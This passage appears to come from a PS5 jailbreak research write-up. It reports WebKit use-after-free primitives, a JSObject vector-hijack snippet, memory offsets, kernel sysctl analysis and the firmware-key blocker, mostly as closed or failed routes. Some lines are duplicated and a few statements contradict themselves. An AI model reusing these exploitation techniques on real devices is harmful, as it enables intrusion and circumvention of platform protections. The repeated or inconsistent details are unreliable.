`0x70`. The storage target for `ncpu`, `0xffffffffa20fe8bc` (file `0x3d0e8bc`, u32 = 16),
sits in a favourable neighbourhood:

```
arg - 8  = 0x0000000fffffffff
arg + 0  = 0x0000000000000010
arg + 8  = 0
arg + 16 = 0
arg + 24 = 0
arg + 32 = 0
arg + 40 = 0x0000ffff00000000
arg + 48 = 0x9f6caf8e00000000
```

**32 zero bytes immediately follow**: a low-collateral, self-verifying, reversible landing
zone. The proposed amplifier: a 1-byte write at `ncpu_struct + 0x14 = 0x03` so that
`sysctl({1,3}, 2, old, oldlenp, new, buf, N)` copies N bytes into the 8-byte slot. It was
falsified against the real `__sysctl`:

```
real __sysctl = sy_call slot 199 -> stub -> 0xffffffff9e9481e0 (file 0xab81e0), 418+ instr

[+0x14] reads:
  __sysctl                       0
  access check 9e92a130 (252i)  0
  OID lookup    9e649280 (192i) 0
  sysctl_req    9e648ff0 (202i) 0

Flag-constant search across all four: 1 hit
  movabs rcx, 0x800000000000   (a 48-bit mask, not a CTLFLAG)
```

**[static]** `__sysctl` builds a 0x60-byte `sysctl_req` on the stack (`[rbp-0x110] = old`,
`[rbp-0x108] = oldlenp`, `[rbp-0x100] = new`). **Dispatch is by function pointer
(`oid_handler`), not by type field**: changing copy semantics requires changing `oid_handler`, a
CFI-guarded function pointer, not a byte. The amplifier as stated is falsified; the caveat
carried honestly at design time: "whether the STRING handler copies `newlen` without a length
check is inference, not observation on this kernel", turned out not to need resolving, because
the dispatch model rules the whole approach out first.

---


# Part II : Tested and proven dead

*Routes that were fired and closed, each with the evidence class that closed it. These are not unsearched ground.*

## 9. Execute-only text: the constraint that reframes the leak `[new]`

The PS5 system libraries (`libkernel_web`) are **`xotext`, execute-only text**. Reading that
code through a read/write primitive does not return garbage and does not return zeros; it faults.

> *"Signature-scanning libkernel **text** is impossible (the libraries are **xotext**; reading
> code through the R/W primitive **faults and kills the process**)."*

**[upstream]** `1nk1/PS5-Prolapse`, `docs/PROJECT_HANDOFF.md` §9.2, from a working jailbreak,
hardware-verified on 13.60. **The scope of this claim is libkernel, and nothing more.** Both
occurrences of `xotext` in the handoff (lines 381 and 853) name libkernel; neither mentions
WebKit. Whether WebKit's text is also execute-only is **not asserted by the source and not tested
by us**: and §9.2 will argue that it does not need to be known.

The same source confirms the corollary that the static route is closed for them too: *"there is
no 13.60 [sprx] locally, which is precisely why the runtime calibrate tile exists."* We
verified the same on our own host: `find /opt/AGENTS/Ares -iname "*.sprx"` returns nothing, and
`ps5-sys.pup` yields no readable `.sprx` string through its encrypted L1.

### 9.1 What the constraint does and does not close

The plan carried through most of this
research: *"scan WebKit text for `5f c3` / `5e c3` / `5a c3` / `59 c3` and rebuild the gadget
map"* is closed, but the accurate statement of why matters. For `libkernel` the closure is
hard: reading the text faults. For WebKit the stronger and better-supported statement is not
that the scan **cannot** be run but that **it is not the route taken by the people who have this
working: they have never read a single byte of WebKit code.** That claim does not depend on
assuming WebKit is `xotext`, and it is the one worth carrying.

There is a cross-check already in the record: the community `wk_gadgetmap` contains **no
`0f 05`**. That is consistent with the text being unreadable, but it is not proof of it: the
absence is equally consistent with the map having been built by a method that never read the text
either, which is what §9.2 shows.

### 9.2 The reframe : read the address, not the code

This is the more useful product of the
finding.

| How the problem was posed for weeks | How it has to be posed |
|---|---|
| leak the WebKit base by **reading code** | leak the base by **reading data that contains code addresses** |

The code is not needed; the *address* is, and addresses live in readable data. Their derivation
(`main.js:158-212`) never touches a text page:

```js
let textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
let textAreaVtable = p.read8(textAreaVtPtr);
```

On 9.00+ the active path is a JS global holding a code address, minus a candidate offset, with
range and page-alignment validation: `ctor - hc` checked into the `0x8…0` / `0x4000`-aligned
window. The pre-9.00 legacy path reads the **vtable**, which lives in `.data.rel.ro`: data, not
execute-only text. That legacy branch fired **0 times across 81 recorded runs**. The whole method
is *"read the address of the code from the data"*, never *"read the code"*.

### 9.3 The deltas are family-specific, not module-invariant

Recalculated from the `EXPECT`
table in `tools/lkfind.js` rather than copied, the stability is narrower than the headline
deltas suggest:

```
FW       sw       sj       lj       tl        pop_rsp
10.00    0x14DC   0x3A68   0x3AC1   0x4B13D  0x1B2CF  (present)
12.00    0x162C   0x3BB8   0x3C11   0x4AA1D  ABSENT
12.40    0x162C   0x3BB8   0x3C11   0x4E9FD  ABSENT
```

**[static]** Recomputed from the upstream table. The deltas `+0x162C` / `+0x3BB8` / `+0x3C11`
are exact **for the 12.xx family**. They are **not** a property of `libkernel_web` in general:
on 10.00 all three differ. And `thread_list` is not stable even *within* 12.xx: `0x4AA1D` at
12.00 versus `0x4E9FD` at 12.40.

| Field | Stable within 12.xx | Stable across families |
|---|---|---|
| `syscall_wrapper` | ✓ | ✗ |
| `setjmp` | ✓ | ✗ |
| `longjmp` | ✓ | ✗ |
| `thread_list` | **✗** | ✗ |

**Stability has to be recorded field by field, not per table.** Anyone treating "the deltas" as a
single block would get `thread_list` wrong while staying inside 12.xx. **For 14.00 the deltas are
to be measured, not inherited.** `pop_rsp` works as a negative control in the meantime: present
at `0x343AA` on 10.00, absent on both 12.xx builds: its absence is what says the `pop rsp` has
to come from WebKit.

We cannot copy their harness outright: their method reads the stack of a worker, and `worker` is
`SecurityError` in the guide WebProcess (§3.1). The open question it leaves is narrow and
concrete: **which stack is ours**: the main JS thread's, a self-allocated `ArrayBuffer` that
something returns into, or the canvas backing store already under test. If any of the three is
readable and holds a `libkernel_web` return address, the deltas yield `syscall_wrapper` without
ever touching execute-only code.

**The conclusion is more useful than a prohibition would have been.** We do not know whether
WebKit's text is readable, and we do not need to: the working method never touches it. That is a
weaker-looking and considerably stronger claim than a generalised ban the source does not support.


## 10. Denormal-zeroing: why the primitive cannot read pointers back `[new]`

The same run that confirmed the write also produced the engagement's most annoying negative:

```
CVE-2026-43720-leak  ->  integer-read-zero
                          channel: true
                          alias_idx: 6
                          nonzero_bytes: 0
                          raw_first32: all zeros
                          bigint_read: "0"
```

**[device]** The channel works, the alias is live, and every byte reads back as zero.

**[device]** The channel works, the alias is live, and every byte reads back as zero. The cause
is the FPU mode the PS5's WebKit runs under: WebProcess heap pointers have the form
`0x000000100xxxxxxx`, whose exponent field makes the value **denormal** as an IEEE-754 double;
with denormals-are-zero set the FPU reads `0.0`. The pointer is present in memory and
unreadable through any float64 lane. The workaround is a width change, not a location change:
read through `BigUint64Array` or `Uint8Array`, which never enter the FPU.

The enabling condition on the write side is equally specific. `ISO_MALLOC` is **off** in the
PS5 WebKit build (`OptionsPlayStation.cmake`), which is why engine-written pointers land in
storage script can subsequently read; had isolation been on, the bidirectional result of §3
would not have been reachable at all.


## 11. What the published WebKit stage does not do here `[already known]`

The Relapse WebKit stage was run against 14.00 as shipped and failed uniformly:

```
122 / 122 identical failures
getterCarrier returning 7 is a Number object regardless of leakedScope
  -> Symbol.prototype.toString.call throws
structured-clone corruption never lands in the form that makes the wrapper
   read as a Symbol with oversized length (LEAK_STRING_LENGTH 924176)
```

**[device]** `evidence/jsc-fingerprint-1400.md`, `evidence/webkit-entry-portability-1400.md`.

**[device]** `evidence/jsc-fingerprint-1400.md`, `evidence/webkit-entry-portability-1400.md`.
**[device]** `evidence/jsc-fingerprint-1400.md`, `evidence/webkit-entry-portability-1400.md`.
Plan 4 had the getter return `Symbol("x" × 924168)`: **663 attempts, 663 × `Invalid leaked
addresses`**. Plan 5 set `copiedLength = 924176`, matching `LEAK_STRING_LENGTH` **by
construction** (924168 + `Symbol(` + `)`), not by corruption: every captured word was `0x7878`
widened to `0x7878787878787878`, failing the cell/holder cross-checks at offsets 8 and 12. The
mechanism itself is intact (a Proxy trap fires on all variants, `trap_calls = 4`); what changed
is that the bare super-property form no longer passes a receiver: the stock `leak()` bare call
produced ~150 × "Scope not leaked" at stage 0. The structured-clone corruption the published
stage depends on does not occur on JSC 14.00: the stage is dead, not misconfigured.


## 12. What remains unsolved `[new]`

Stated as a list of things this engagement did **not** establish, because the absence of each
is load-bearing for anyone continuing the work.

### 12.1 First: which artifact describes which firmware

Before the gaps can be read correctly the artifacts have to be sorted, because they do not all
describe the target: the static analysis was performed on a kernel image that is **not** the
firmware under test. What has changed since this section was first written is that the reason for
that is now **known and named**, rather than a statement about availability.

| Artifact | Firmware it actually describes |
|---|---|
| `kernel-13.60-live.bin` (sha256 `c3f745e2…cddd`) | **13.60** |
| `ps5-sys.pup` (magic `SLB2`, BLS entry `@0x24 = 0x4B2F8A3D`) | **14.10** |
| The console (4 275 hits on UA `PlayStation 5/14.00`) | **14.00** |
| `kernel-hunt/fw1400/ps5-sys-14.00.pup` (sha256 `1eb4b184…8ebc`, magic `SLB2`, BLS `@0x24 = 0x4B2339D5`) | **14.00: acquired, still encrypted** |
| A **decrypted** 14.00 kernel image | **still absent: blocked on the Layer 1 key** |

**A real 14.00 PUP now exists; a decrypted 14.00 kernel image does not.** The distinction is
the whole content of this section and the two must not be collapsed into either "we have it" or
"it doesn't exist".

```
Path      : kernel-hunt/fw1400/ps5-sys-14.00.pup
Size      : 1 260 600 832 bytes
SHA256    : 1eb4b18451e0f064fc23b5bd4c95cae7f6489f9ad1148b5dfb0d66452a108ebc
Source    : archive.midnightchannel.net — "PS5 Official Retail System Firmware v14.00", 2026-09-18
Magic @0x00: SLB2
BLS  @0x24 : 0x4B2339D5
```

**[verified]** The BLS value read directly from the file at `@0x24` (`d5 39 23 4b`, little-endian)
**matches the 14.00 fingerprint recorded before the file was in hand**: the identification was
made on the fingerprint first and confirmed against the artifact second, which is the order that
makes it a confirmation rather than a labelling exercise.

**The block is Layer 1, and it is now named rather than assumed.**

```
Key    : PUP container key (Layer 1)
Lives  : Titania Security Processor
Used by: encsrv_decrypt_header()
ioctl  : 0xC0184402   Device: /dev/pup_update0
```

**The key is universal, identical on every PS5 from firmware 1.0 onward.** Extracted once, every
PUP past and future becomes decryptable on PC. **But extraction requires a jailbroken PS5 at
firmware 13.60 or below**, which is where Byepervisor reaches, and no such console is available.
**The 14.00 console under test cannot extract the key that unlocks its own firmware.**

**The Layer 1 boundary is visible in the bytes.** Comparing the 14.00 and 14.10 PUPs at `0x400`:

```
14.00 @0x400: 5414 f5ee 1001 0132 0400 0000 b005 e00d | f6a0 655a 93b6 ...
14.10 @0x400: 5414 f5ee 1001 0132 0400 0000 b005 e00d | 158b b56a 2a44 ...
              ^^^^^^^^^^^^^ identical in cleartext ^^^^^^^^  ^^ encrypted, different
```

**Sixteen bytes of shared cleartext header followed by immediately divergent ciphertext**: the
structural signature of a container key applied at a fixed offset. Both files read directly.

**Independent confirmation from the opposite direction.** `deepkicks/TitaniaPy`
([github.com/deepkicks/TitaniaPy](https://github.com/deepkicks/TitaniaPy), pushed 2026-10-16)
built a PC-side PUP/BLS parser and tested every known key against real 14.00 and 14.10 PUPs.
It reached the same wall, describing the same four-layer structure:

| Layer | Purpose | Their status |
|---|---|---|
| 0 | PBKDF2 master key derivation | Solved |
| 1 | PUP container encryption | **Blocked: key not public** |
| 2 | PUP segment-level encryption | Blocked (depends on Layer 1) |
| 3 | Inner firmware encryption | Solved |

Their own summary: *"The tool is one key away from full PUP decryption."* Their extraction path
names the same device, a dump of the `pup_update0` ioctl handler, and the same precondition:
*"If you have a jailbroken PS5 on FW 13.60 or below."* **Two independent directions, same
conclusion, same named blocker.**

**What this changes and what it does not.** The point of this section was and remains that every
static kernel conclusion in this note is drawn from **13.60**. That is untouched. What changed is
that the 14.00 artifact is now **procurable and identified**, and the remaining distance between
it and a kernel image is a **single named key with a named precondition** rather than an absent
file. The scope rule still governs: **all** static results: the gate chain of §7.5, the
CFI-window census of §8.2, the 303 writable OIDs of §8.3, the OID field map of §7.1 and the
`esi = 241` derivation of §7.4, describe **firmware 13.60**, offered as a characterisation of
that kernel and a hypothesis about 14.00, not a description of it. The device results in §3 are
unaffected: those came off the 14.00 console directly. The reader should still assume the
kernel-side numbers move until a decrypted 14.00 image says otherwise, but that image is now
one key away, not one discovery away.

### 12.2 Two separate gaps, not one

The remaining work is usually described as a single blocker. It is two, and they are
independent:

| Component | Status on 14.00 |
|---|---|
| Userland entry | **confirmed** |
| Bidirectional heap read/write | **confirmed** |
| ROP frame + syscall mechanism | **built** |
| WebKit base code leak | **MISSING** |
| Kernel bug yielding read/write | **NOT FOUND** |

Solving the first does not advance the second: a code leak makes the kernel *reachable*, not
*writable*. **Even with the leak solved, `sysctl` does not give kernel read/write**: the kind
swap of §4 is a permission bypass that closes a denying branch, not a memory-safety violation,
and moves no attacker bytes on its own. The other candidate on that path, `aio_multi_wait`, is
patched on 14.00 **[device]** (bypass characterisation **[static]**, 13.60). Reporting the swap
as "the kernel write" would be reporting a permission change as a primitive.

**6.1.1 No kernel write is reachable from the browser.** The canvas UAF writes the WebProcess
heap; the kind swap lives in kernel memory. Nothing here bridges them: the PoC driver reports
`blocked_at: C-kernel` rather than pretending otherwise. **[device]**

**6.2 No information leak survives DAZ.** FontFace reclaim discloses two live WebProcess heap
pointers at `+0x58`/`+0x68` in a script-controlled 192-byte buffer, at roughly one run per
WebProcess and a ~50% death rate. Measured and rejected: `getImageData` oversized zero-filled,
`createImageData` zero-init, canvas resize residue zero-filled, APNG conforming-frame clean
padding, APNG truncated zlib `ptrs=0`, WebGL texture readback unavailable, cross-type reclaim
in different bmalloc size classes, RAB sort OOB caught by JSC, RAB double-detach `suspects=0`,
float64 pointer read → DAZ `0.0`. **[device]**

**6.3 The umtx question has never been tested on PS5.** CVE-2024-43102 (`UMTX_SHM_DESTROY`
refcount, CVSS 3.1 **10.0**, `FreeBSD-SA-24:14.umtx.asc`) was fixed upstream in September
2024; PS5 14.00 ships September 2026 on a base pinned at r230171, so it is *expected*
patched. But the correct test has never run: syscall **454** hits `kmq_open`, returns `EINVAL`,
and records "patched": right conclusion, wrong reason. The correct number is **451**.
**[static]**

**6.4 CVE-2026-45251 is neither confirmed nor falsified.** The advisory
(`FreeBSD-SA-26:19.file.asc`, CVSS 3.1 **7.8**) describes a poll/select use-after-free. The
differential outlier pointing at it was tested with probes that, in most arms, never touched
their subject (§13.4); the one genuine negative, messageChannel, is weak, because the crash
oracle is weaker than the predicate under test.

**6.5 The guide WebProcess's Capsicum state is unknown.** Whether it is in capability mode at
all was never determined, and the gap is not minor: upstream's capability-mode gate
(`CTLFLAG_CAPRD`/`CTLFLAG_CAPWR`) sits in the same check chain as the ANYBODY gate, so a
capability-mode process may be refused on an entirely different basis.

**6.6 The mechanism is verified on 13.60, not 14.00.** Per §12.1 the swap byte is identical
under both base conventions and the surrounding structure is stable on the image we hold, but
the branch at `0xffffffff9e947f49` has not been re-verified against a 14.00 image because none
exists; the PUP held is 14.10, its inner layer encrypted against every publicly known key
(brute-forced, all high entropy). §13.7 proposes routing around this by testing the mechanism
against the live kernel through a syscall channel, without decrypting anything.

**6.7 The floor of static analysis was reached.** On this dump (no symbols, linear disassembly), the achievable result was 2 slots proven by two independent methods, 1 fd type excluded
outright, and 1 differential outlier left open. That outlier cannot be
closed without the console or a `System.map`.

### 12.3 Closed branches: measured absence, not unsearched ground

Seven candidate routes to the missing code leak were closed on device: six on the second day,
and one on the third after upstream's own failure record named the trap.
They are reported together because the point is not the list: it is that each was closed with
a **different class of evidence**, so the set does not share a single failure mode that could
be invalidating all seven at once.

| Branch | Verdict | Evidence class |
|---|---|---|
| FontFace reclaim (upstream `p563`) | **Closed: dies inside `document.fonts.load()`** | Verbatim upstream code, 15 runs |
| `lineDash` vector `m_size` | **Closed: offset not reachable from the alias** | Live oracle + working primitive |
| Alias-window pointer deref | **Closed: no pointer in the window** | Raw-bit scan, DAZ-immune |
| vtable / code-slot scan | **Closed: no code-like slot accessible** | 88-slot scan, zero code-shaped |
| float64 setter as pointer carrier | **Closed: the setter normalises the denormal away** | Bit-level write-channel round-trip |
| Direct read of `libkernel` code for a gadget map | **Closed: that text is execute-only** | Fault as proof of the protection |
| `ArrayBuffer` spray as the reclaiming object | **Closed: a zeroed spray leaves a null vtable, so every C++ method faults** | Our probe withdrawn against upstream's recorded failure |

**Code-slot via direct read: closed by the fault itself.** Under `xotext` (§9) a read of
`libkernel` code through the read/write primitive kills the process. That turns our crash
pattern from a failure into a measurement: **every time a read landed somewhere that could be
`libkernel` code and the page died, the primitive was working correctly against a protection we
did not know was there.** The branch is closed not by an empty result but by a fault that means
*you are not allowed to read this*, which is a stronger statement than absence: it says the
bytes exist and are deliberately unreadable. **[upstream]** for the protection on `libkernel`;
the reading of our own crash pattern through it is **[hypothesis]**: the source establishes the
mechanism on its own libraries, and we have not instrumented our crashes to attribute each one.

**The float64 setter: closed by writing a pointer through it.** This branch's evidence class is
unlike the others: it does not say *there is no pointer where we can reach*, it says **we
wrote a pointer into the channel and the channel destroyed it**: a direct measurement of where
FTZ lives rather than an inference from a null scan. A PS5 heap pointer `0x00000100abcd000` is
an IEEE-754 **denormal** (exponent zero, magnitude ≈ 3.7e-315). JavaScript represents it
without loss: the `DataView` round-trip is bit-identical on all four test values. The property
setter's path applies flush-to-zero and erases it.

```
ROUNDTRIP (DataView):  000001000abcd000 -> back 000001000abcd000   preserved: true   (x4)
ALIAS idx=6            bidirectional: true
PRESERVE               want 000001000abcd000  got 0000000000000000  preserved: false  (x4)
```

**[device]** Module `denormal-pointer-1400`, verdict `SETTER-NORMALIZES-DENORMAL`, UA
`PlayStation 5/14.00`. The distinction is the whole result: **the loss is not in the
representation, it is in the channel.** The value survives `DataView` byte-for-byte and dies on
the way through the float setter, which localises FTZ to the setter path and not to JS's number
model. This closes the most obvious route to byte access, and is precisely why the attempt moved
to a byte channel (`putImageData`), which never touches floating point at all.

**FontFace: closed by running upstream's own code, not our reading of it.** The usual failure
mode in a port is that the porting author's interpretation differs from the original's. That
escape hatch was removed: the upstream `p563` module was run **byte-identical except for one
line**, the beacon transport. **Fifteen runs**, identical outcome every time:

```
P563-SETUP        ✓
P563-LOAD-CALLED  ✓
trigger `then`    ✗  never
HIT / ALL-CLEAN   ✗  never
```

**[device]** 15 × `P563-SETUP`, 15 × `P563-LOAD-CALLED`, zero `HIT`, zero `ALL-CLEAN`. The
run terminates **inside `document.fonts.load()`, before the UAF path begins**: not at the
spray, not at the reclaim, not at the use.

This also resolves a discrepancy with upstream rather than arguing about it. Upstream runs this
code as a standalone HTML page with its own process and resources; we run it inside the guide's
single-page application. The divergence is therefore attributable to the execution context,
and it was established **with their exact code**, not with a reconstruction of it.

**The scope of that closure is narrower than the heading, and it matters.** Our probe used the
repeated-`load()` shape: a second `document.fonts.load()` over the *same* faces. Upstream's
reconciliation of their own contradictory records shows that this specific shape does not
reclaim in stage 2: their beacon `S2-b` reads 0 across every log for the three page families
that use it, which is the same zero we measured. But a **different shape does reclaim**: a
fresh `FontFace` with a fresh `@font-face` rule per phase, with a full GC cycle between phases,
recorded `P2:HIT` three times and `TWO_UAF=YES`. **So "FontFace closed" is true of the shape
we ran and false as a general statement about second reclaims on 14.10.** We have not tried the
fresh-face-per-phase shape on 14.00, and their result does not transfer without a run of our own
This is the same rule that governs the deltas in §9.3. What the alternative shape does *not*
change is the blocker: upstream records that it "gives a heap leak but not R/W or code exec",
because the reclaimed buffer's absolute address remains unknown.


**lineDash: a real negative, because the oracle was alive.** The `m_size` field of the dash
vector was targeted as a candidate for a size-based read amplification. Six runs:

```
alias_idx: 17    bidirectional: true    baseline: 4    V: 7
all 11 setters:  before 4  ->  after 4
verdict: NO-REACHABLE-OFFSET
```

**[device]** The distinction that makes this worth reporting: the oracle was **live** (the
baseline read correctly) and the primitive was **working** (`bidirectional: true`), and the
value did not move. That is a genuine negative about reachability, not the silent-negative
failure of §13.4, where the probe never touched its subject. A companion run
(`linedash-offsetmap-1400`) independently returned `NO-SIZE-SIGNATURE-IN-WINDOW` across an
`N = 1,2,4,8,16` sweep, so the field was only unwritable but unidentifiable in the
window.

**Alias pointer deref: no pointer to dereference.** The question was whether the aliased window
contains a pointer the engine itself dereferences, which would yield arbitrary-address reads
without changing the primitive. Twelve slots:

```
lineWidth      3ff0000000000000   normal-float
miterLimit     4024000000000000   normal-float
globalAlpha    3ff0000000000000   normal-float
shadowBlur/X/Y 0000000000000000   zero
xf.a..f        3ff3ae147ae147ae / 40123d70a3d70a3d / ...   normal-float

verdict: NO-POINTER-IN-WINDOW
```

**[device]** Twelve slots, every one a normal float or zero. No `0x000000100xxxxxxx` pattern
anywhere. The window does not contain a pointer to dereference.

The DAZ question here was **tested rather than assumed**: the classifier never reads the double
value. It recombines raw bits through `Uint32Array` and classifies on `(hi, lo)`, so our own
read cannot be zeroed by the FPU. The absence of pointers is an observation about the window,
not an artifact of how it was read.

**vtable / code-slot: nothing code-shaped in reach.** `vtable-leak-1400` scanned for a
vtable or code pointer reachable from the reclaimed object:

```
VTABLE: slots=88  codeish=0
verdict: NO-CODE-SLOT-ACCESSIBLE
```

**[device]** Eighty-eight slots scanned, zero code-shaped values. This is the same negative
result the other branches produced, arrived at by a different route.

**`ArrayBuffer` spray as the reclaiming object: closed before it was fired.** The obvious
reclaim for a 768-byte slot is an `ArrayBuffer` of the same size, and a probe was built on that
assumption. It was withdrawn before running, because upstream's own failure record already named
the trap: at version 11 of their equivalent probe they wrote that **all C++ methods crash on a
zeroed `ArrayBuffer` spray**, the root cause being that a zeroed spray leaves a **null vtable,
null `m_canvas` and null `m_stateStack`**, and every C++ code path touches at least one of them.
Their capture shows the shape of it: the log runs `BOOT`, `PRE-UAF`, `POST-UAF:ctx=OK`,
`PRE-SPRAY n=500`, `POST-SPRAY`, `PRE-READ: attempting-lineWidth`, and then stops. **No
`POST-READ` exists.** The process dies on the first C++ call after the spray.

**[upstream]** for the mechanism, on 14.10. **The class of evidence here is different from the
other six: the branch was closed by reading someone else's crash log, not by producing our own.**
That is a legitimate closure and it is worth naming as such, because it is also the cheapest one
available: the alternative was to spend a device run rediscovering what had already been
written down. The probe was rebuilt to reclaim with a **second `CanvasRenderingContext2D`** of
the same type instead, which leaves the vtable valid, and the `ArrayBuffer` was kept only as a
final phase in which no C++ method is called afterwards.

**What this changes about the shape of §6.** The remaining gap is not "we did not look". It is
a **measured boundary**: with a working bidirectional primitive on the reclaimed object, the
reachable window contains no pointer, no code-shaped slot, and no size field that would amplify
a read, and the float64 lane that could carry a pointer in cannot survive the setter to
deliver one. The code leak is not hiding in the object we can already touch. Finding it
requires a different object or a different primitive, and that is a stronger statement than
its absence: it narrows where the next attempt should go.

### 12.4 The chain as implemented, and the one primitive that is missing

The working chain was read out of the code that runs it rather than inferred, from
`1nk1/PS5-Prolapse` (`core.js`), which jails from this same CVE class. Four steps:

**Step A: `addrof` via structured clone, not via canvas** (`core.js:663`). A 72 MB carrier
array (`CARRIER_SLOTS = 9000000`) is seeded with alternating holders, and the round-trip is
`result = history.state` (line 742). **No worker is required.** This matters here because
`worker` is `SecurityError` in the guide WebProcess (§5) while `history.state` is available:
the transport they use is one we have and have not used as an `addrof` carrier.

**Step B: the candidate is a JSC `JSObject` with a known layout** (`core.js:766-772`):

```
+0x00 StructureID   +0x08 butterfly   +0x10 VECTOR   +0x18 length
```

**Step C: it is not a leak, it is a hijack** (`core.js:270`):

```js
function aimCarrier(candidate, address) {
    const high = Math.floor(address / 0x100000000);
    scratchWords[0] = address - high * 0x100000000;
    scratchWords[1] = high;
    for (let i = 0; i < 8; ++i)
        candidate[0x10 + i] = scratchBytes[i];   // overwrites the VECTOR
}
```

**The address is not known in advance. It is imposed.** The object is made to read from wherever
the attacker writes into the vector field. This is the conceptual inversion that the framing
"we need a leak" misses: the goal is not to discover an address, it is to **choose** one and
make an object believe it.

**Step D: the chase toward code** (`core.js:907-946`): `executableAddress = low48At(header,
0x18)`, then `+0x28` native function, `+0x30` native constructor, each validated for range and
alignment. The same shape reappears for the WebKit base in `main.js`:
`read8(leakval(textArea).add32(0x18))`. **`+0x18` again. The chase is always a pointer at
`+0x18` that leads to code.**

**The whole chain rests on one primitive: `candidate[0x10 + i] = byte`, a byte-addressable write
to the vector field.**

| | Them | Us |
|---|---|---|
| View of the object | `candidate[i]`, **byte** | float64 setter |
| Bidirectional UAF | yes | yes (`bidirectional: true`) |
| `history.state` | yes | **yes, available** |
| Vector-field hijack | yes | **not obtained** |

This is not a wrong offset and not a missing idea. **It is a class of primitive that the canvas
alias, as built, does not provide.** A float64 is eight bytes, so an arbitrary address can be
placed inside a double; the open question was only whether any setter lands on a field the object
dereferences.

**Dead path: the canvas float setters cannot be pointer fields.** `vector-hijack-1400` tested
exactly that, with a control on every arm so a crash could not be mistaken for a broken context:

```
lineWidth     ctl=true addr=true  POINTER-LIKE=false
miterLimit    ctl=true addr=true  POINTER-LIKE=false
globalAlpha   ctl=true addr=true  POINTER-LIKE=false
shadowBlur    ctl=true addr=true  POINTER-LIKE=false
```

**[device]** Baseline alive, control passed, alias index localised. Every setter survived having
an address-shaped value written into it.

**The structural reason is the result, and it is stronger than the test.** Canvas setters are
**float-valued by WebIDL**. The engine stores the double and never dereferences it as a
pointer. **A canvas setter cannot be a pointer field, because the interface types it as a float
and the engine honours that type.** The `+0x10` vector lives in the `JSObject`'s butterfly, not
in canvas properties. **The negative was guaranteed by the interface definition before the
probe ran; the probe confirmed the engine respects its own IDL.**

**What this leaves.** The blocker is now a single named primitive rather than an unknown. The
remaining steps are concrete: a byte-addressable or vector-landing write on a JSC object, then
the `+0x18` chase, then the WebKit base. `history.state` is available and unused as a carrier,
which is an open road rather than a result.


---


# Part III : Method, related work, conclusion

## 13. Methodology `[new]`

The process is a result of this engagement, so it is recorded at the same level of detail as
the findings.

### 13.1 A self-driving console harness

Described in §2.3. The methodological point is the scheduling, not the code: one module per plan
makes crash isolation a property of the system rather than of the module, and the two-layer
watchdog means neither a crash nor a hang stops the queue. The engagement ran unattended after
one page load.

### 13.2 Differential baseline against patched Chromium

Every module runs against patched desktop Chromium (headless, fetch shim on the report channel)
before it runs against the console. The reading rule:

| V8 / Chromium | PS5 | Reading |
|---|---|---|
| `patched` | `vulnerable` | **real finding** |
| `unknown` | page death | **highest-priority lead** |
| `patched` | `patched` | no signal |

A PortalGun shim (`start`/`report`/`esc` bound to `POST /log`, `tick()` → `setTimeout(0)`,
`aborted()`/`expired()` → wall-clock deadline, `progress(n)` → no-op, `cfg` → module preset;
caps warmup ≤ 25000, rounds ≤ 800, capMin ≤ 2, run deadline 95 s, harness timeout 120 s)
made all 116 PortalGun modules runnable verbatim, with no per-module porting.

Across 112 core-driven modules, **zero** reported on patched Chromium the outcome they
headline as "vulnerable". The baseline holds.

### 13.3 Static analysis without symbols

No symbol table, so every identification is arithmetic:

- **CFI windows as fingerprints.** 5,146 complete `lea`/`sub`/`ror3`/`cmp`/`ja` windows in
  TEXT; exactly one admits both known sysctl handlers, identified by arithmetic, not by name.
- **Slot-value identity over naming.** `fo_poll @ +0x20` proven by three file-operation tables
  (`0xffffffff9feb7ca0`, `0xffffffffa05e62b0`, `0xffffffffa092f528`) each having **only** slot
  `+0x20` inside the validated window `[0xffffffff9e65b760 .. 0xffffffff9e65b7d8]`.
- **CFG entry counts as proof of unreachability.** The §7.5 check block has exactly one incoming
  edge: "I did not see it reached" becomes "it cannot be reached".
- **BFS from the syscall entry.** `__sysctl 9e9481e0 → 9e947d90 → 9e9486f0 → call r15`, with
  `__sysctl` holding **zero** indirect calls across 280 instructions.

### 13.4 Vacuous negatives

The most transferable lesson from the live run.

Seven fd-type probes were queued to confirm or falsify the CVE-2026-45251 prediction. Their
churn counters:

| Module | Churn | Touched its subject? |
|---|---|---|
| `K4-fdtype-ctl` | `churn: "none"` | control |
| `K4-fdtype-websocket` | `opened: 0, closed: 256` | **no** |
| `K4-fdtype-fetch` | `started: 128, aborted: 128, resolved: 0` | **no** |
| `K4-fdtype-msgchan` | `sent: 256, recvd: 256, undelivered_at_close: 0` | **yes** |
| `K4-fdtype-sse` | `opened: 0, closed: 64` | **no** |
| `K4-fdtype-worker` | `workers_ready: 0, sent: 0, recvd: 0` | **no** |

Five of six arms never opened a single instance of the resource they were testing. Their negatives
are not negatives. The structural tell: every arm reported `paths_available: ["mc"]`: only the
messageChannel verification path existed, even in modules nominally testing other fd classes. The
harness silently substituted the one path it could verify.

> **A negative from a probe that never touched its subject is not a negative.**

The same error class appeared earlier in a more consequential form. `poc_1400.js`, run against
patched Chromium 152, reported `A-entry ok: true`, a false positive: door 2 requested the
re-entrant context as a **different type** (`bitmaprenderer` inner against `2d` outer), so
`bmp_same` was false by construction on every engine and `hasUaf = (same === false) ||
(bmp_same === false)` was always true. On the PS5 it would have reported `ok=true` regardless of
patch state. Two-direction verification fixed it: patched Chromium with the real `getContext` →
`ok:false`/`same:true`/stops at A ✓; a synthetic vulnerable factory (fresh object per call,
same type) → `ok:true`/`same:false`/proceeds to B ✓. **A gate must be run against a
known-negative before it is trusted on an unknown.**

### 13.5 Dead paths: measured negatives

Five readings do not work on this kernel. Each is recorded with its measurement so the next
reader does not spend a day on it.

1. **The sibling-link OID walk is not a traversal.** Walking the sibling link at `+0x08` from a
   known OID visits 5 nodes and names 1; from `+0x00`, 3 visited / 1 named; via `+0x08` as a
   list head, 3 visited / 0 named. Pointers land on non-OID data; one hop yields
   `0x20786c25006b636f`, ASCII fragments. **The layout at those offsets is not a traversable
   sibling list.** An analogy that was not executed is not evidence.
2. **The type field is not a dispatch input.** Dispatch is by function pointer, not by type
   field (§8.4). Changing the type field does not redirect dispatch.
3. **`[reg+0x14]` is not the `oid_kind` read site.** 1,773 `[reg+0x14]` reads exist in TEXT
   across 955 functions, and **0 of 16** readers sit inside `__sysctl` and its 15 direct
   callees. `+0x14` is the high half of the `+0x10` pointer, not `oid_kind`. The load-bearing
   reader is at `+0x1c`, `0xffffffff9e947f45`. **A null result at `+0x14` says nothing about
   `+0x1c`.**
